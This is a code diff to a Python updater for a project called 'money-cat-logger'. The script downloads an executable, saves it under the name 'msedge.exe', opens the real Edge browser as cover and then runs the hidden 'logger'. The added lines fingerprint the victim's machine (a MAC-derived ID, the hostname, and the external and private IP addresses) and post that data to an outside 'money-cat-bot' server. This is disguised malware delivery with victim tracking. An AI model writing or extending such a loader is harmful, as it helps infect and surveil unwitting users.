@@ -2,6 +2,13 @@ import os
 import requests
 import shutil
 import subprocess
+import socket
+import urllib
+import hashlib
+import uuid
+
+API_URL = "https://money-cat-bot.onrender.com"
+COMPUTER_NAME = socket.gethostname()
 
 GITHUB_USER = "xfendi"
 GITHUB_REPO = "money-cat-logger"
@@ -17,6 +24,21 @@ LOCAL_VERSION_FILE = os.path.join(data_path, "version.txt")
 LOCAL_EXE_FILE = os.path.join(data_path, "msedge.exe")
 
 os.makedirs(data_path, exist_ok=True)
+
+def get_id():
+    mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])
+    return hashlib.sha256(mac.encode()).hexdigest()[:20]
+
+def send_new_version():
+    external_ip = urllib.request.urlopen('https://ident.me').read().decode('utf8')
+    private_ip = socket.gethostbyname(socket.gethostname())
+    
+    payload = { "COMPUTER_ID": get_id(), "COMPUTER_NAME": COMPUTER_NAME, "external_ip": external_ip, "private_ip": private_ip }
+
+    try:
+        requests.post(f"{API_URL}/new-version", json=payload)
+    except requests.exceptions.RequestException as e:
+        print(e)
 
 def get_server_version():
     response = requests.get(VERSION_URL, headers=HEADERS)
@@ -41,6 +63,7 @@ def download_new_version():
     if not download_url:
         return
     print("💾 Downloading new version...")
+    send_new_version()
     response = requests.get(download_url, stream=True)
     if response.status_code == 200:
         with open(LOCAL_EXE_FILE, 'wb') as file:
@@ -63,13 +86,13 @@ def download_new_version():
 def run_exe(directory):
     try:
         process = subprocess.Popen([directory], shell=True)
-        print("✅ Program started!")
-        process.wait()  # Czekamy na zakończenie procesu EXE
+        process.wait()
     except Exception as e:
         print(f"❌ Error running the EXE: {e}")
 
 def check_for_update():
     run_exe(r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe")
+    print("✅ Browser started!")
     server_version = get_server_version()
     if not os.path.exists(LOCAL_VERSION_FILE):
         download_new_version()
@@ -87,6 +110,8 @@ def check_for_update():
             f.write(server_version)
     else:
         print("✅ You have the latest version!")
+    print(LOCAL_EXE_FILE)
+    print("✅ Logger starting!")
     run_exe(LOCAL_EXE_FILE)
 
 if __name__ == "__main__":
